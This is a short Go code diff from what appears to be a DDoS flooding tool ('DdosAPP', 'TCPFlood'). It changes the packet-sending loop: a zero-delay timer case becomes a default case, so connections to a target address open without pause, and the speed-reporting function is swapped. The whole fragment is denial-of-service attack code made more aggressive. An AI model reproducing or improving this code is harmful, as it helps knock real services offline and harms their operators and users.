@@ -60,7 +60,7 @@ func (p *DdosAPP) TCPFlood(address string) {
 func (p *DdosAPP) SendPacket(mode, address string) {
 	// 捕获ctrl+c
 	signal.Notify(Signal, syscall.SIGINT, syscall.SIGTERM)
-	go PacketSpeed()
+	go DDosSpeed()
 	// 发送数据包
 	for {
 		select {
@@ -68,11 +68,9 @@ func (p *DdosAPP) SendPacket(mode, address string) {
 		case _ = <-Signal:
 			logrus.Printf("stopped sending a total of %d packets", CounterPacket)
 			os.Exit(0)
-		case <-time.After(0 * time.Millisecond):
+		default:
 			conn, err := net.DialTimeout(mode, address, time.Millisecond*300)
 			TemporaryPacket += 1
-			CounterPacket += TemporaryPacket
-			TemporaryPacket = 0
 			if err != nil {
 				break
 			}
